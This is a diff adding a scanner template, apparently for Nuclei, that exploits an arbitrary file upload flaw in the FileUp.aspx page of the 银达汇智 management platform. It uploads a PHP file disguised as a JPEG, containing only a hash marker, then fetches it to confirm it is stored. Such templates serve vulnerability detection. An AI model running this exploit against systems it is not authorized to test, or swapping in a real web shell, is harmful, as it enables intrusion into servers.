@@ -1,0 +1,64 @@
+id: poc-ydhz-intelligent-file-upload
+info:
+  name: 银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template exploits an arbitrary file upload vulnerability in 银达汇智 智慧综合管理平台 FileUp.aspx.
+
+variables:
+  t1: "{{rand_int(1,1000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - /Module/FileUpPage/FileUp.aspx?orgid=1&type=NNewsContent
+    headers:
+      Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9
+    body: |
+      --62907949903a4c499178971c9dab4ad9
+      Content-Disposition: form-data; name="Filedata"; filename="123.php"
+      Content-Type: image/jpeg
+
+      <?php {{t2}} ?>
+      --62907949903a4c499178971c9dab4ad9--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "php"
+
+    extractors:
+      - type: regex
+        name: file_path
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "([0-9]+.php)"
+
+  - id: verify-file
+    method: GET
+    path:
+      - /imgnews/imgcontent/1/{{file_path}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "php"
